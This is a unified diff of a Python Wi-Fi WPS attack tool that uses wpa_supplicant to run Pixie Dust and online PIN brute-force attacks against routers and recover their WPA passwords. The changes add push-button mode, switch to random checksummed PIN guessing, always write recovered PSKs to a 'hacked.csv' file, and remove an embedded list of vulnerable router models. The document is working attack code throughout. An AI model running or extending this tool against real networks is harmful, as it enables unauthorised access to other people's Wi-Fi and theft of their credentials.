@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 import sys
 import subprocess
 import os
@@ -12,6 +14,7 @@ from datetime import datetime
 import collections
 import statistics
 import csv
+from pathlib import Path
 from typing import Dict
 import random
 
@@ -33,6 +36,7 @@ print(f'''
 ╚════════════════════════════════════════════════════╝
 \033[0m
 ''')
+
 
 class NetworkAddress:
     def __init__(self, mac):
@@ -386,7 +390,7 @@ class ConnectionStatus:
 
 class BruteforceStatus:
     def __init__(self):
-        self.start_time = datetime.now().strftime("%Y-%m-d %H:%M:%S")
+        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         self.mask = ''
         self.last_attempt_time = time.time()   # Last PIN attempt start time
         self.attempts_times = collections.deque(maxlen=15)
@@ -439,8 +443,8 @@ class Companion:
         self.connection_status = ConnectionStatus()
 
         user_home = str(pathlib.Path.home())
-        self.sessions_dir = f'{user_home}/.BiRi/sessions/'
-        self.pixiewps_dir = f'{user_home}/.BiRi/pixiewps/'
+        self.sessions_dir = f'{user_home}/.Hack/sessions/'
+        self.pixiewps_dir = f'{user_home}/.Hack/pixiewps/'
         self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
         if not os.path.exists(self.sessions_dir):
             os.makedirs(self.sessions_dir)
@@ -455,8 +459,13 @@ class Companion:
         self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                      stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
         # Waiting for wpa_supplicant control interface initialization
-        while not os.path.exists(self.wpas_ctrl_path):
-            pass
+        while True:
+            ret = self.wpas.poll()
+            if ret is not None and ret != 0:
+                raise ValueError('wpa_supplicant returned an error: ' + self.wpas.communicate()[0])
+            if os.path.exists(self.wpas_ctrl_path):
+                break
+            time.sleep(.1)
 
     def sendOnly(self, command):
         """Sends command to wpa_supplicant"""
@@ -469,7 +478,15 @@ class Companion:
         inmsg = b.decode('utf-8', errors='replace')
         return inmsg
 
-    def __handle_wpas(self, pixiemode=False, verbose=None):
+    @staticmethod
+    def _explain_wpas_not_ok_status(command: str, respond: str):
+        if command.startswith(('WPS_REG', 'WPS_PBC')):
+            if respond == 'UNKNOWN COMMAND':
+                return ('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
+                        'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
+        return '[!] Something went wrong — check out debug log'
+
+    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None):
         if not verbose:
             verbose = self.print_debug
         line = self.wpas.stdout.readline()
@@ -480,7 +497,6 @@ class Companion:
 
         if verbose:
             sys.stderr.write(line + '\n')
-
         if line.startswith('WPS: '):
             if 'Building Message M' in line:
                 n = int(line.split('Building Message M')[1].replace('D', ''))
@@ -535,7 +551,7 @@ class Companion:
                 print('[⛶] Scanning…')
         elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
             self.connection_status.status = 'WPS_FAIL'
-            print('[-] wpa_supplicant returned WPS-FAIL')
+            print('[⦸] wpa_supplicant returned WPS-FAIL')
 #        elif 'NL80211_CMD_DEL_STATION' in line:
 #            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
         elif 'Trying to authenticate with' in line:
@@ -592,20 +608,21 @@ class Companion:
     def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
         if not os.path.exists(self.reports_dir):
             os.makedirs(self.reports_dir)
-        filename = self.reports_dir + 'stored'
+        # Save to the requested file name
+        filename = self.reports_dir + 'All WIFI Passoword And WPS Pin'
         dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
         with open(filename + '.txt', 'a', encoding='utf-8') as file:
             file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
                         dateStr, bssid, essid, wps_pin, wpa_psk
                     )
             )
-        writeTableHeader = not os.path.isfile(filename + '.csv')
-        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
+        writeTableHeader = not os.path.isfile(self.reports_dir + 'hacked.csv')
+        with open(self.reports_dir + 'hacked.csv', 'a', newline='', encoding='utf-8') as file:
             csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
             if writeTableHeader:
                 csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
             csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
-        print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')
+        print(f'[i] Credentials saved to {filename}.txt, hacked.csv')
 
     def __savePin(self, bssid, pin):
         filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
@@ -631,7 +648,7 @@ class Companion:
                     else:
                         raise IndexError
                 except Exception:
-                    print('Invalid number')
+                    print('[X]Invalid number! Enter a valid number.')
                 else:
                     break
         elif len(pins) == 1:
@@ -642,25 +659,30 @@ class Companion:
             return None
         return pin
 
-    def __wps_connection(self, bssid, pin, pixiemode=False, verbose=None):
+    def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None):
         if not verbose:
             verbose = self.print_debug
         self.pixie_creds.clear()
         self.connection_status.clear()
         self.wpas.stdout.read(300)   # Clean the pipe
-        print(f"[⟳] Trying PIN '{pin}'…")
-        r = self.sendAndReceive(f'WPS_REG {bssid} {pin}')
+        if pbc_mode:
+            if bssid:
+                print(f"[>] Starting WPS push button connection to {bssid}…")
+                cmd = f'WPS_PBC {bssid}'
+            else:
+                print("[>] Starting WPS push button connection…")
+                cmd = 'WPS_PBC'
+        else:
+            print(f"[⟳] Trying PIN '{pin}'…")
+            cmd = f'WPS_REG {bssid} {pin}'
+        r = self.sendAndReceive(cmd)
         if 'OK' not in r:
             self.connection_status.status = 'WPS_FAIL'
-            if r == 'UNKNOWN COMMAND':
-                print('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
-                      'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
-            else:
-                print('[!] Something went wrong — check out debug log')
+            print(self._explain_wpas_not_ok_status(cmd, r))
             return False
 
         while True:
-            res = self.__handle_wpas(pixiemode=pixiemode, verbose=verbose)
+            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)
             if not res:
                 break
             if self.connection_status.status == 'WSC_NACK':
@@ -673,7 +695,7 @@ class Companion:
         self.sendOnly('WPS_CANCEL')
         return False
 
-    def single_connection(self, bssid, pin=None, pixiemode=False, showpixiecmd=False,
+    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
                           pixieforce=False, store_pin_on_fail=False):
         if not pin:
             if pixiemode:
@@ -688,11 +710,14 @@ class Companion:
                             raise FileNotFoundError
                 except FileNotFoundError:
                     pin = self.generator.getLikely(bssid) or '12345670'
-            else:
+            elif not pbc_mode:
                 # If not pixiemode, ask user to select a pin from the list
                 pin = self.__prompt_wpspin(bssid) or '12345670'
-
-        if store_pin_on_fail:
+        if pbc_mode:
+            self.__wps_connection(bssid, pbc_mode=pbc_mode)
+            bssid = self.connection_status.bssid
+            pin = '<PBC mode>'
+        elif store_pin_on_fail:
             try:
                 self.__wps_connection(bssid, pin, pixiemode)
             except KeyboardInterrupt:
@@ -704,14 +729,15 @@ class Companion:
 
         if self.connection_status.status == 'GOT_PSK':
             self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
-            if self.save_result:
-                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
-            # Try to remove temporary PIN file
-            filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
-            try:
-                os.remove(filename)
-            except FileNotFoundError:
-                pass
+            # Always save credentials to file, regardless of self.save_result
+            self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
+            if not pbc_mode:
+                # Try to remove temporary PIN file
+                filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
+                try:
+                    os.remove(filename)
+                except FileNotFoundError:
+                    pass
             return True
         elif pixiemode:
             if self.pixie_creds.got_all():
@@ -772,40 +798,29 @@ class Companion:
         return False
 
     def smart_bruteforce(self, bssid, start_pin=None, delay=None):
-        if (not start_pin) or (len(start_pin) < 4):
-            # Trying to restore previous session
-            try:
-                filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
-                with open(filename, 'r') as file:
-                    if input('[?] Restore previous session for {}? [n/Y] '.format(bssid)).lower() != 'n':
-                        mask = file.readline().strip()
-                    else:
-                        raise FileNotFoundError
-            except FileNotFoundError:
-                mask = '0000'
-        else:
-            mask = start_pin[:7]
-
-        try:
-            self.bruteforce = BruteforceStatus()
-            self.bruteforce.mask = mask
-            if len(mask) == 4:
-                f_half = self.__first_half_bruteforce(bssid, mask, delay)
-                if f_half and (self.connection_status.status != 'GOT_PSK'):
-                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
-            elif len(mask) == 7:
-                f_half = mask[:4]
-                s_half = mask[4:]
-                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
-            raise KeyboardInterrupt
-        except KeyboardInterrupt:
-            print("\nAborting…\nStay With\nTHBD")
-            filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
-            with open(filename, 'w') as file:
-                file.write(self.bruteforce.mask)
-            print('[i] Session saved in {}'.format(filename))
-            if args.loop:
-                raise KeyboardInterrupt
+        # Random 8-digit WPS PINs with valid checksum
+        tried_pins = set()
+        self.bruteforce = BruteforceStatus()
+        while True:
+            # Generate random 7-digit base
+            base_pin = random.randint(0, 9999999)
+            base_pin_str = str(base_pin).zfill(7)
+            pin_int = int(base_pin_str)
+            checksum = self.generator.checksum(pin_int)
+            pin = base_pin_str + str(checksum)
+            if pin in tried_pins:
+                continue
+            tried_pins.add(pin)
+            self.bruteforce.mask = pin
+            self.single_connection(bssid, pin)
+            if self.connection_status.status == 'GOT_PSK':
+                break
+            if delay:
+                time.sleep(delay)
+            # Optional: stop after a very large number of attempts to avoid infinite loop
+            if len(tried_pins) >= 10000000:  # All possible 7-digit bases
+                print('Tried all possible random pins!')
+                break
 
     def cleanup(self):
         self.retsock.close()
@@ -822,156 +837,9 @@ class WiFiScanner:
     """docstring for WiFiScanner"""
     def __init__(self, interface, vuln_list=None):
         self.interface = interface
-        # এখানে আমরা vulnwsc.txt এর কন্টেন্ট সরাসরি এম্বেড করেছি
-        if vuln_list is None:
-            # Built-in vulnerable devices list (vulnwsc.txt এর কন্টেন্ট)
-            self.vuln_list = [
-                "ADSL RT2860",
-                "AIR3G WSC Wireless Access Point AIR3G WSC Device",
-                "AirLive Wireless Gigabit AP AirLive Wireless Gigabit AP",
-                "Archer_A9 1.0",
-                "Archer A2 5.0",
-                "Archer A5 4.0",
-                "Archer C2 1.0",
-                "Archer C2 3.0",
-                "Archer C5 4.0",
-                "Archer C6U 1.0.0",
-                "Archer C20 1.0",
-                "Archer C20 4.0",
-                "Archer C20 5.0",
-                "Archer C50 1.0",
-                "Archer C50 3.0",
-                "Archer C50 4.0",
-                "Archer C50 5.0",
-                "Archer C50 6.0",
-                "Archer MR200 1.0",
-                "Archer MR200 4.0",
-                "Archer MR200 5.0",
-                "Archer VR300 1.20",
-                "Archer VR400 3.0",
-                "B-LINK 123456",
-                "Belkin AP EV-2012-09-01",
-                "DAP-1360 DAP-1360",
-                "DIR-819 v1.0.1",
-                "DIR-842 DIR-842",
-                "DWR-921C3 WBR-0001",
-                "D-Link N Router GO-RT-N150",
-                "D-Link Router DIR-605L",
-                "D-Link Router DIR-615H1",
-                "D-Link Router DIR-655",
-                "D-Link Router DIR-809",
-                "EC120-F5 1.0",
-                "EV-2009-02-06",
-                "Enhanced Wireless Router F6D4230-4 v1",
-                "Home Internet Center KEENETIC series",
-                "Home Internet Center Keenetic series",
-                "Huawei Wireless Access Point RT2860",
-                "JWNR2000v2(Wireless AP) JWNR2000v2",
-                "Keenetic Keenetic series",
-                "Linksys Wireless Access Point EA7500",
-                "Linksys Wireless Router WRT110",
-                "NBG-419N NBG-419N",
-                "Netgear AP EV-2012-08-04",
-                "NETGEAR Wireless Access Point R6220",
-                "NETGEAR Wireless Access Point R6260",
-                "N/A EV-2010-09-20",
-                "Ralink Wireless Access Point RT2860",
-                "Ralink Wireless Access Point WR-AC1210",
-                "RTL8196E",
-                "RTL8xxx EV-2009-02-06",
-                "RTL8xxx EV-2010-09-20",
-                "RTL8xxx RTK_ECOS",
-                "RT-G32 1234",
-                "Sitecom Wireless Router 300N X2 300N",
-                "Smart Router R3 RT2860",
-                "Tenda 123456",
-                "Timo RA300R4 Timo RA300R4",
-                "TD-W8151N RT2860",
-                "TD-W8901N RT2860",
-                "TD-W8951ND RT2860",
-                "TD-W9960 1.0",
-                "TD-W9960 1.20",
-                "TD-W9960v 1.0",
-                "TD-W8968 2.0",
-                "TL-MR3020 3.0",
-                "TL-MR3420 5.0",
-                "TL-MR6400 3.0",
-                "TL-MR6400 4.0",
-                "TL-WA855RE 4.0",
-                "TL-WR840N 4.0",
-                "TL-WR840N 5.0",
-                "TL-WR840N 6.0",
-                "TL-WR841N 13.0",
-                "TL-WR841N 14.0",
-                "TL-WR841HP 5.0",
-                "TL-WR842N 5.0",
-                "TL-WR845N 3.0",
-                "TL-WR845N 4.0",
-                "TL-WR850N 1.0",
-                "TL-WR850N 2.0",
-                "TL-WR850N 3.0",
-                "TL-WR1042N EV-2010-09-20",
-                "Trendnet router TEW-625br",
-                "Trendnet router TEW-651br",
-                "VMG3312-T20A RT2860",
-                "VMG8623-T50A RT2860",
-                "WAP300N WAP300N",
-                "WAP3205 WAP3205",
-                "Wi-Fi Protected Setup Router RT-AC1200G+",
-                "Wi-Fi Protected Setup Router RT-N10U",
-                "Wi-Fi Protected Setup Router RT-N12",
-                "Wi-Fi Protected Setup Router RT-N12D1",
-                "Wi-Fi Protected Setup Router RT-N12VP",
-                "Wireless Access Point .",
-                "Wireless Router 123456",
-                "Wireless Router RTL8xxx EV-2009-02-06",
-                "Wireless WPS Router <#ZVMODELVZ#>",
-                "Wireless WPS Router RT-N10E",
-                "Wireless WPS Router RT-N10LX",
-                "Wireless WPS Router RT-N12E",
-                "Wireless WPS Router RT-N12LX",
-                "WN3000RP V3",
-                "WN-200R WN-200R",
-                "WPS Router (5G) RT-N65U",
-                "WPS Router DSL-AC51",
-                "WPS Router DSL-AC52U",
-                "WPS Router DSL-AC55U",
-                "WPS Router DSL-N14U-B1",
-                "WPS Router DSL-N16",
-                "WPS Router DSL-N17U",
-                "WPS Router RT-AC750",
-                "WPS Router RT-AC1200",
-                "WPS Router RT-AC1200_V2",
-                "WPS Router RT-AC1750",
-                "WPS Router RT-AC750L",
-                "WPS Router RT-AC1750U",
-                "WPS Router RT-AC51",
-                "WPS Router RT-AC51U",
-                "WPS Router RT-AC52U",
-                "WPS Router RT-AC52U_B1",
-                "WPS Router RT-AC53",
-                "WPS Router RT-AC57U",
-                "WPS Router RT-AC65P",
-                "WPS Router RT-AC85P",
-                "WPS Router RT-N11P",
-                "WPS Router RT-N12E",
-                "WPS Router RT-N12E_B1",
-                "WPS Router RT-N12 VP",
-                "WPS Router RT-N12+",
-                "WPS Router RT-N14U",
-                "WPS Router RT-N56U",
-                "WPS Router RT-N56UB1",
-                "WPS Router RT-N65U",
-                "WPS Router RT-N300",
-                "ZyXEL NBG-416N AP Router",
-                "ZyXEL NBG-418N AP Router",
-                "ZyXEL NBG-418N AP Router NBG-418N",
-                "ZyXEL Wireless AP Router NBG-417N"
-            ]
-        else:
-            self.vuln_list = vuln_list
+        self.vuln_list = vuln_list
 
-        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
+        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/hacked.csv'
         try:
             with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
                 csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
@@ -1118,15 +986,15 @@ class WiFiScanner:
             return text
 
         if self.vuln_list:
-            print('[⌔] Network marks:\n {1} {0} {2} {0} {3}'.format(
+               print('\033[95m[⌔] Network marks:\033[0m\n {1} {0} {2} {0} {3}'.format(
                 '',
                 colored('◈ Possibly vulnerable', color='green'),
                 colored('⛉ WPS locked', color='red'),
                 colored('✔ Already stored', color='yellow')
             ))
-        print('[≡] Networks list:')
-        print('{:<2} {:18} {:12} {:13} {:4} \n    {:30}  {:12}'.format(
-            '[#]', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'Wi-Fi Router Name', 'Wi-Fi Router Model'))
+        print('\033[94m[≡] Networks list:\033[0m')
+        print('{:<2} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
+            '[#]', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model\n'))
 
         network_list_items = list(network_list.items())
         if args.reverse_scan:
@@ -1136,7 +1004,7 @@ class WiFiScanner:
             model = '{} {}'.format(network['Model'], network['Model number'])
             essid = truncateStr(network['ESSID'], 25)
             deviceName = truncateStr(network['Device name'], 27)
-            line = '{:<3} {:18} {:12} {:12} {:4} \n    {:30}  {:12}'.format(
+            line = '{:<3} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
                 number, network['BSSID'], essid,
                 network['Security type'], network['Level'],
                 deviceName, model
@@ -1159,7 +1027,7 @@ class WiFiScanner:
             return
         while 1:
             try:
-                networkNo = input('[✓] Select target (press Enter to refresh ⟳): ')
+                networkNo = input('[✓] Select target (press Enter to refresh ⟳): \n')
                 if networkNo.lower() in ('r', '0', ''):
                     return self.prompt_network()
                 elif int(networkNo) in networks.keys():
@@ -1167,7 +1035,7 @@ class WiFiScanner:
                 else:
                     raise IndexError
             except Exception:
-                print('Invalid number')
+                print('[X]Invalid number! Enter a valid number.')
 
 
 def ifaceUp(iface, down=False):
@@ -1202,16 +1070,19 @@ Optional arguments:
     -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
     -K, --pixie-dust         : Run Pixie Dust attack
     -B, --bruteforce         : Run online bruteforce attack
+    --push-button-connect    : Run WPS push button connection
 
 Advanced arguments:
     -d, --delay=<n>          : Set the delay between pin attempts [0]
     -w, --write              : Write AP credentials to the file on success
     -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
     -X, --show-pixie-cmd     : Always print Pixiewps command
-    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['engpinxt.txt']
+    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
     --iface-down             : Down network interface when the work is finished
     -l, --loop               : Run in a loop
     -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
+    --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
+                               (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
     -v, --verbose            : Verbose output
 
 Example:
@@ -1264,6 +1135,11 @@ if __name__ == '__main__':
         help='Run online bruteforce attack'
         )
     parser.add_argument(
+        '--pbc', '--push-button-connect',
+        action='store_true',
+        help='Run WPS push button connection'
+        )
+    parser.add_argument(
         '-d', '--delay',
         type=float,
         help='Set the delay between pin attempts'
@@ -1281,8 +1157,8 @@ if __name__ == '__main__':
     parser.add_argument(
         '--vuln-list',
         type=str,
-        default=None,  # Changed from file path to None (use built-in list)
-        help='Use custom file with vulnerable devices list (optional)'
+        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
+        help='Use custom file with vulnerable devices list'
     )
     parser.add_argument(
         '-l', '--loop',
@@ -1293,6 +1169,13 @@ if __name__ == '__main__':
         '-r', '--reverse-scan',
         action='store_true',
         help='Reverse order of networks in the list of networks. Useful on small displays'
+    )
+    parser.add_argument(
+        '--mtk-wifi',
+        action='store_true',
+        help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit '
+             '(for internal Wi-Fi adapters implemented in MediaTek SoCs). '
+             'Turn off Wi-Fi in the system settings before using this.'
     )
     parser.add_argument(
         '-v', '--verbose',
@@ -1307,42 +1190,47 @@ if __name__ == '__main__':
     if os.getuid() != 0:
         die("Run it as root")
 
+    if args.mtk_wifi:
+        wmtWifi_device = Path("/dev/wmtWifi")
+        if not wmtWifi_device.is_char_device():
+            die("Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): "
+                "/dev/wmtWifi does not exist or it is not a character device")
+        wmtWifi_device.chmod(0o644)
+        wmtWifi_device.write_text("1")
+
     if not ifaceUp(args.interface):
         die('Unable to up interface "{}"'.format(args.interface))
 
+
     while True:
         try:
-            if not args.bssid:
-                # Load vulnerable devices list
-                if args.vuln_list and os.path.exists(args.vuln_list):
-                    # Use custom file if provided and exists
+            companion = Companion(args.interface, args.write, print_debug=args.verbose)
+            if args.pbc:
+                companion.single_connection(pbc_mode=True)
+            else:
+                if not args.bssid:
                     try:
                         with open(args.vuln_list, 'r', encoding='utf-8') as file:
                             vuln_list = file.read().splitlines()
-                    except:
-                        vuln_list = None
-                else:
-                    # Use built-in list (already embedded in WiFiScanner class)
-                    vuln_list = None
-                
-                scanner = WiFiScanner(args.interface, vuln_list)
-                if not args.loop:
-                   print(
+                    except FileNotFoundError:
+                        vuln_list = []
+                    scanner = WiFiScanner(args.interface, vuln_list)
+                    if not args.loop:
+                        print(
     '\033[1;36m[⌕] BSSID not specified ('
     '\033[1;33m--bssid'
     '\033[1;36m)\n'
     '[⌕] Scanning for available networks'
-    '\033[0m'
-)
-                args.bssid = scanner.prompt_network()
+    '\033[0m')
+                    args.bssid = scanner.prompt_network()
 
-            if args.bssid:
-                companion = Companion(args.interface, args.write, print_debug=args.verbose)
-                if args.bruteforce:
-                    companion.smart_bruteforce(args.bssid, args.pin, args.delay)
-                else:
-                    companion.single_connection(args.bssid, args.pin, args.pixie_dust,
-                                                args.show_pixie_cmd, args.pixie_force)
+                if args.bssid:
+                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
+                    if args.bruteforce:
+                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
+                    else:
+                        companion.single_connection(args.bssid, args.pin, args.pixie_dust,
+                                                    args.show_pixie_cmd, args.pixie_force)
             if not args.loop:
                 break
             else:
@@ -1350,13 +1238,16 @@ if __name__ == '__main__':
         except KeyboardInterrupt:
             if args.loop:
                 if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
-                    print("Aborting…\nStay With\nMOHAMMAD ALAMIN")
+                    print("Aborting…")
                     break
                 else:
                     args.bssid = None
             else:
-                print("\nAborting…\nStay With\nMOHAMMAD ALAMIN")
+                print("\nAborting…")
                 break
 
     if args.iface_down:
         ifaceUp(args.interface, down=True)
+
+    if args.mtk_wifi:
+        wmtWifi_device.write_text("0")
